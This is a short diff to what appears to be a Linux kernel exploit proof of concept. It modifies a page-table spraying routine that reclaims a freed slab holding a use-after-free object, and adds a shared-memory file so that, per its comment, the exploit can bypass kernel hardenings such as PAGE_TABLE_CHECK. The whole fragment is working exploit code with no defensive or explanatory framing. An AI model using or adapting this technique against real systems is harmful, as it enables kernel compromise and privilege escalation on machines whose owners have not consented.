@@ -129,16 +129,32 @@ int prepare_page_tables(void)
 {
 	unsigned long *addr = NULL;
 	long i = 0;
+	int fd;
 
 	printf("[!] preparing page tables\n");
 
+	/*
+	 * We use the SHM file to freeze the memory once the PoC is finished.
+	 * This allows us to bypass some of the hardenings.
+	 * For example, PAGE_TABLE_CHECK.
+	 */
+	fd = shm_open("/notavirus", O_CREAT | O_RDWR, 0666);
+	if (fd < 0) {
+		perror("shm_open");
+		return EXIT_FAILURE;
+	}
+
+	if (ftruncate(fd, PAGE_SIZE) < 0) {
+		perror("ftruncate");
+		return EXIT_FAILURE;
+	}
 	/*
 	 * Prepare the resources for PUD that will later reclaim
 	 * the freed slab containing UAF object.
 	 */
 	for (i = 0; i < PT_ENTRIES; i++) {
 		addr = mmap(PT_INDICES_TO_VIRT(PGD_N, i, 0, 0, 0), PAGE_SIZE, PROT_WRITE,
-			    MAP_FIXED | MAP_SHARED | MAP_ANONYMOUS, -1, 0);
+			    MAP_FIXED | MAP_SHARED, fd, 0);
 		if (addr == MAP_FAILED) {
 			perror("[-] mmap");
 			return EXIT_FAILURE;
